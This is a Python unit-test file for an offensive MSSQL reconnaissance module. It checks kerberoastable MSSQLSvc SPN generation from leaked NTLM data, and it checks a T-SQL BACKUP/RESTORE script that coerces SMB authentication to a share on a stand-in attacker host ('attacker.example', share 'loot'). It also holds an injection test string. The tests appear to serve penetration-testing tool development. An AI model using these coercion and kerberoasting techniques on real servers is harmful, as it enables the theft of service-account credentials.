"""Native additions to the MSSQL module: MSSQLSvc kerberoast SPN emission
(driven by the pre-auth NTLM leak) and BACKUP-to-UNC coercion T-SQL. Both
are wire-derived: MS-KILE / SQL Server BOL for the SPN string shape, and
T-SQL BACKUP/RESTORE reference for the coercion path."""

from __future__ import annotations

import unittest

from recce.core.models import Host, Port
from recce.services.db import mssql


def _host(port: int = 1433, service: str = "ms-sql-s") -> Host:
    return Host(ip="127.0.0.1",
                ports=[Port(portid=port, service=service, state="open")])


class KerberoastSpn(unittest.TestCase):
    """MSSQLSvc/<fqdn>:<port> for the default instance, MSSQLSvc/<fqdn>:<instance>
    for a named instance; empty when the NTLM leak did not give us the FQDN."""

    def test_default_instance_uses_port(self):
        nt = {"dns_computer": "sql01.contoso.local",
              "dns_domain": "contoso.local", "nb_domain": "CONTOSO"}
        self.assertEqual(mssql.kerberoast_spn(nt, 1433),
                         "MSSQLSvc/sql01.contoso.local:1433")

    def test_named_instance_uses_instance(self):
        nt = {"dns_computer": "sql01.contoso.local"}
        self.assertEqual(mssql.kerberoast_spn(nt, 1433, instance="PROD"),
                         "MSSQLSvc/sql01.contoso.local:PROD")

    def test_non_default_port_flows_through(self):
        nt = {"dns_computer": "sql01.contoso.local"}
        self.assertEqual(mssql.kerberoast_spn(nt, 14330),
                         "MSSQLSvc/sql01.contoso.local:14330")

    def test_no_fqdn_returns_empty(self):
        # Only NetBIOS - no FQDN -> no SPN we can hand out (the pre-auth leak
        # didn't give us enough for a valid MSSQLSvc target).
        self.assertEqual(mssql.kerberoast_spn({"nb_computer": "SQL01"}), "")
        self.assertEqual(mssql.kerberoast_spn({}), "")
        self.assertEqual(mssql.kerberoast_spn(None), "")

    def test_finding_emitted_when_pre_auth_ntlm_leak_has_fqdn(self):
        # findings() ingests a probes dict keyed 'ip:port' -> {"ntlm":..., "prelogin":...}.
        # A pre-auth NTLM leak carrying dns_computer must produce a
        # mssql_kerberoastable_spn finding, medium severity, with the SPN in
        # the command and the FQDN + domain in the detail.
        h = _host(1433)
        nt = {"dns_computer": "sql01.contoso.local",
              "dns_domain": "contoso.local", "nb_domain": "CONTOSO",
              "nb_computer": "SQL01"}
        fs = mssql.findings(
            [h], {"127.0.0.1:1433": {"ntlm": nt, "prelogin": {}}})
        kf = [f for f in fs if f["kind"] == "mssql_kerberoastable_spn"]
        self.assertEqual(len(kf), 1)
        f = kf[0]
        self.assertEqual(f["severity"], "medium")
        self.assertEqual(f["target"], "127.0.0.1:1433")
        self.assertIn("MSSQLSvc/sql01.contoso.local:1433", f["command"])
        self.assertIn("sql01.contoso.local", f["detail"])
        self.assertIn("contoso.local", f["detail"])
        # narrative from _NARRATIVE is folded onto the finding, not silent.
        self.assertIn("Kerberos", f["narrative"])

    def test_no_finding_when_ntlm_leak_lacks_fqdn(self):
        # NetBIOS-only leak (or NTLM failed altogether) must not emit the
        # kerberoast finding - we would be inventing an SPN we cannot verify.
        h = _host(1433)
        for nt in ({"nb_domain": "CONTOSO"}, {}, None):
            probes = {"127.0.0.1:1433": {"ntlm": nt or {}, "prelogin": {}}}
            fs = mssql.findings([h], probes)
            kinds = {f["kind"] for f in fs}
            self.assertNotIn("mssql_kerberoastable_spn", kinds,
                             f"unexpected kerberoast finding for ntlm={nt!r}")


class BackupUncCoercion(unittest.TestCase):
    """T-SQL BACKUP DATABASE / RESTORE VERIFYONLY as a coercion primitive:
    the payload must reach out to the attacker share so SMB auth is
    attempted with the SQL service account (regardless of the backup
    itself failing on the far side)."""

    def test_script_contains_both_coercion_primitives(self):
        script = mssql.build_backup_unc_script("attacker.example")
        self.assertIn("BACKUP DATABASE master TO DISK", script)
        self.assertIn("RESTORE VERIFYONLY FROM DISK", script)
        # UNC path renders both leading backslashes (Python literal '\\\\' -> '\\\\'
        # rendered = '\\\\' - i.e. the on-wire two backslashes MSSQL needs).
        self.assertIn("\\\\attacker.example\\recce", script)
        # TRY/CATCH so BACKUP failing doesn't abort the RESTORE half.
        self.assertEqual(script.count("BEGIN TRY"), 2)
        self.assertEqual(script.count("BEGIN CATCH"), 2)
        # Terminated with exit so the batch actually runs under mssqlclient.
        self.assertTrue(script.strip().endswith("exit"))

    def test_script_uses_custom_share(self):
        script = mssql.build_backup_unc_script("10.10.10.10", share="loot")
        self.assertIn("\\\\10.10.10.10\\loot\\recce_backup.bak", script)

    def test_share_and_lhost_are_sanitised(self):
        # Single quotes and backslashes in operator input would either break
        # the T-SQL literal or (worse) let an injected value split into a
        # second UNC path. They're stripped before the literal is built.
        script = mssql.build_backup_unc_script("evil'; DROP",
                                               share="lo\\ot'sh")
        # No stray single quote appears mid-literal after sanitising.
        # Every ' in the script is the outer literal boundary or the
        # ERROR_MESSAGE() sentinel below - count them and check parity.
        # (Simplest robust check: no substring "'; DROP" survives.)
        self.assertNotIn("'; DROP", script)
        self.assertNotIn("\\ot", script)

    def test_share_default_when_blank(self):
        # Blank share must fall back to the default so the UNC path is valid
        # and does not collapse to "\\host\\<file>" (which is not a share).
        script = mssql.build_backup_unc_script("h", share="")
        self.assertIn("\\\\h\\recce\\recce_backup.bak", script)

    def test_runner_gates_on_impacket_availability(self):
        # No impacket-mssqlclient installed -> the runner must return
        # (False, "impacket-mssqlclient not installed") rather than raising
        # or silently succeeding. Mirrors run_xp_dirtree's contract so
        # callers can treat both coercion primitives identically.
        from unittest.mock import patch
        with patch.object(mssql, "_mssqlclient_cmd", return_value=None):
            ok, err = mssql.run_backup_unc("10.0.0.1", {"user": "u", "secret": "p"},
                                           "attacker.example")
        self.assertFalse(ok)
        self.assertIn("impacket-mssqlclient", err)


if __name__ == "__main__":
    unittest.main()
